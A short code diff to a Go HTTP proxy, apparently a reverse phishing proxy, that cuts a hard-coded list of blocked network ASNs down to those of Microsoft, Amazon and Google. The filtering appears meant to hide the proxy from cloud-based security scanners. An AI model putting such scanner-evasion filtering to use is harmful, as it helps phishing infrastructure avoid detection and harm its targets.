@@ -239,7 +239,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// List of ASNs to block (Integers)
 						// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
-						blockedASNs := []uint{17012, 1449, 206753, 59065, 26444, 19527, 36040, 396982, 16550, 16591, 35693, 397316, 8075, 16509, 15169, 29981}
+						blockedASNs := []uint{16509, 15169, 8075}
 
 						for _, blockedASN := range blockedASNs {
 							if record.AutonomousSystemNumber == blockedASN {
